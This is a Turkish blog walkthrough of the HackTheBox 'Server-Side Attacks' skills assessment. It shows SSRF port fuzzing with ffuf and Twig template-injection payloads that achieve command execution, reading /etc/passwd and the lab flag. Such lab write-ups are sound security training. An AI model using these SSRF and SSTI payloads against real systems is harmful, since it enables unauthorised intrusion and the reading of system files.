---
title: "HackTheBox: Server-Side Attacks"
author: b1lal
categories: [HackTheBox, "Skills Assessment"]
tags: [server-side attacks, ssti, hackthebox, skills assessment, ssrf, api]
render_with_liquid: false
description: "HacktheBox platformunda Server-Side Attacks modülündeki yetenek değerlendirme sorularının çözümünü içermektedir."
media_subpath: /images/hackthebox_server_side_attacks/
layout: post
published: true  
lang: "tr"
image:
  path: server-side-main.webp
  alt: "HackTheBox: Server-Side Attacks"
---

Bu yazımızda HackTheBox platformunda bulunan **Server-Side Attacks** modülündeki yetenek değerlendirme sorularının çözümünü paylaşacağım. Bu modüldeki, yetenek değerlendirme sorusu sunucu taraflı zafiyetleri ne derece kavradığımızı ölçmeyi amaçlamaktadır.


> Bir müşterinin web uygulamasının güvenlik değerlendirmesini yapmakla görevlendirildiniz. 

Bu soruda herhangi bir ön bilgimiz bulunmamaktadır. Amacımız **flag.txt**'yi elde etmektir.


İlk olarak sistemi başlatıyoruz ve bizi bu tarz bir web uygulaması karşılıyor:

![Ana Sayfa](website.png)


Navbar bölümünde bulunan işlevlerin aktif olmadığını görüyoruz. Aşağı indiğimizide orada da herhangi bir aktif işlev bulunmuyor. Sayfa kaynağına göz atıyoruz ve bu **javascript** kodu gözümüze çarpıyor:

```javascript
for (var truckID of ["FusionExpress01", "FusionExpress02", "FusionExpress03"]) {
	var xhr = new XMLHttpRequest();
	xhr.open('POST', '/', false);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.onreadystatechange = function() {
	  if (xhr.readyState === XMLHttpRequest.DONE) {
	    var resp = document.getElementById(truckID)
		if (xhr.status === 200) {
		  var responseData = xhr.responseText;
		  var data = JSON.parse(responseData);

		if (data['error']) {
			resp.innerText = data['error'];
		} else {
			resp.innerText = data['location'];
		}
	  } else {
		  resp.innerText = "Unable to fetch current truck location!"
	  }
	}       
   };
 xhr.send('api=http://truckapi.htb/?id' + encodeURIComponent("=" + truckID));
}
```

Bu kod, `truckID` adlı bir dizi içindeki her bir öğe için bir HTTP POST isteği gönderiyor. İstek, `http://truckapi.htb/` adresine yapılıyor ve `id` parametresi ile birlikte `truckID` değerini içeriyor. 

Bunu ağ trafiğini izleyerek daha iyi anlayabiliriz. Geliştirici araçlarını açıp `Network` sekmesine geçiyoruz ve sayfayı yeniliyoruz. Burada `truckapi.htb` adresine yapılan istekleri görebiliriz.

![Network](network.png)


Şimdi Burp Suite aracını başlatarak bu isteği manipüle etmeyi deneyebiliriz. 

POST isteğini yakalayarak `repeater` sekmesine gönderiyoruz.

![Burp Suite](burp-1.png)


Burada ilk olarak aklıma gelen zafiyet `SSRF`'dir. Bu zafiyet, sunucunun dışarıya istek göndermesini ve bu isteklerin kontrolünü ele geçirmemizi sağlar. Bunun için ilk olarak sayfanın **index.php** dosyasına istek atıyoruz.

![Burp Suite](get-index.png)

Başarılı bir şekilde `index.php` dosyasını getirebilrdi. Şimdi `file://` protokolünü kullanarak sunucunun dosya sistemine erişmeyi deneyelim.

![SSRF Dosya Okuma Denemesi](ssrf-file.png)

Ve görüldüğü başarısız oluyoruz. Muhtemelen sunucu, `file://` protokolünü engelliyor.

Daha sonra `gopher://` protokolünü deniyoruz. Bu protokol, genellikle `SSRF` zafiyetlerinde kullanılır ve sunucunun dosya sistemine erişim sağlamamıza olanak tanır. Bunu denemeden önce sistemde açık olan diğer portları da kontrol etmey için ffuf aracını kullanıyoruz. Başka saldırı yapabileceğimiz bir servisin olup olmadığını görmemiz işimizi kolaylaştıracaktır.

```bash
$ ffuf -u http://94.237.121.185:57068 -c -w ports.txt -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://127.0.0.1:FUZZ" -fr "Failed to connect to" 

        /___\  /___\           /___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.121.185:57068
 :: Wordlist         : FUZZ: /home/htb-ac-1326200/ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : api=http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Failed to connect to
________________________________________________

80                      [Status: 200, Size: 4194, Words: 278, Lines: 126, Duration: 1934ms]
3306                    [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 6ms]
:: Progress: [10000/10000] :: Job [1/1] :: 1197 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

80 portu dışında, 3306 portunun da açık olduğunu görüyoruz. Bu port, genellikle MySQL veritabanı sunucusuna aittir. Şimdi `gopher://` protokolünü kullanarak bu porta istek atmayı deneyelim.

Basit bir şekilde gopher:// isteği atmama rağmen onunda engellendiğini görüyorum.

```http
HTTP/1.1 200 OK
Date: Sun, 15 Jun 2025 08:49:36 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 65
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Error (1): Protocol "gopher" not supported or disabled in libcurl
```

Bunlardan da sonuç çıkmadığına göre ilk **API**'de gördüğümüz `id` parametresi üzerinde biraz oynama yapmak istiyorum.

![SSTI zafiyeti denemesi](ssti-deneme.png)

**ID** parametresine ne yazarsam yazayım olduğu gibi yansıttığını görüyorum SSTI zafiyetini olduğunu biraz daha güçlendirmek için bu payloadı gönderiyorum : `${{<%[%'"}}%\. ` 

Herhangi bir cevap dönmüyor bu sebeple iddialarımız biraz daha güçleniyor. Şimdi burada kullanılan Template Motorunu tespit etmek için `{{7*7}}` payloadunu gönderiyorum.

Ve şu şekilde bir cevap alıyorum:

```json
{"id": "49", "location": "134 Main Street"}
```

Yani başarıyla SSTI zafiyetini tespit ettik. Şimdi bu senaryoda `Jinja` veya `Twig` template motorlarından birinin kullanıldığını biliyoruz. Ama üzerinde daha fazla deneme yapmadan `Twig` kullanıldığını anlayabiliyoruz çümkü `Twig` template motoru PHP dilinde kullanılırken, Jinja Python dilinde kullanılmaktadır.

Bunu kanıtmalak için bu payloadı gönderiyoruz : `{{_self}}`

Aldığımız cevap ise bu şekilde olmakadır :

```json
{"id": "__string_template__0177c07c1ce875b2c81f5871e3da1c28", "location": "134 Main Street"}
```

Yani Twig motorunun `_self` değişkenini kullanarak, Twig'in kendi kendine referans verdiğini görüyoruz. Bu da bize `Twig` template motorunun kullanıldığını gösteriyor.

Şimdi ise dosya okumabileceğimizi test etmek için şu payloadu gönderiyoruz:

```twig
{{['cat\x20/etc/passwd']|filter('system')}} 
```

Ve şu şekilde cevabımızı alıyoruz :

```http
HTTP/1.1 200 OK
Date: Sun, 15 Jun 2025 09:04:08 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Length: 941
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"id": "root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false
Array", "location": "134 Main Street"}
```

Son olarak da flag.txt dosyasını okumak için şu payloadu gönderiyoruz:

```twig
{{['cat\x20/flag.txt']|filter('system')}}
```

Ve istediğimiz cevabı alıyoruz:

```http
HTTP/1.1 200 OK
Date: Sun, 15 Jun 2025 09:10:55 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Length: 83
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"id": "HTB{...SNIP...}Array", "location": "134 Main Street"}
``` 

Bu şekilde `flag.txt` dosyasının içeriğini elde etmiş olduk.

<p style="font-weight:900; color: gray; font-size: 50px; text-align:center;">Okuduğunuz için teşekkür ederim.<p>

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
  white-space: pre-wrap;
}


.post-desc {
  font-family: 'Open Sans', sans-serif !important;
}

</style>
